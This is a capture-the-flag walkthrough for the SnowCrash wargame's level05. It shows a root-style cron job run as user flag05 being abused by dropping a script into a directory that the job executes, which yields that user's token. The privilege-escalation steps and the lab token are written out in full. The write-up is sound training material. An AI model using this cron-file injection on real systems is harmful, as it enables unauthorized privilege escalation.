# Level05 - Cron file

## Checking part
After loggin as level05 we automatically receive a message: You have new mail. Then after some research we can found the file level05 at
```bash
/var/mail/level05
```

After checking on the file content we found:
```bash
level05@SnowCrash:~$ cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:~$
```

So the idea here is that every 2min, /usr/sbin/openarenaserver is execute!

```bash
level05@SnowCrash:~$ ls -la /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
level05@SnowCrash:~$
```

Don't forget that the owner of the file is flag05
So we take a look at the code inside the file openarenaserver:

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
level05@SnowCrash:~$
```

It seems that this script will execute every files in /opt/openarenaserver then delete them immediately.
Cause this script is execute by flag05 (Permissions) we should try to execute getflag .

## Solution

Now we can try to execute getflag with /usr/sbin/openarenaserver:

```bash
level05@SnowCrash:~$ echo "/bin/getflag > /tmp/my_file" > /opt/openarenaserver/my_file
level05@SnowCrash:~$ cat /opt/openarenaserver/my_file
/bin/getflag > /tmp/my_file
level05@SnowCrash:~$
```
Let's wait few minutes (2 max)

```bash
level05@SnowCrash:~$ cat /tmp/my_file
Check flag.Here is your token : viuaaale9huek52boumoomioc
level05@SnowCrash:~$ su level06
Password:
level06@SnowCrash:~$
```
And here we go!!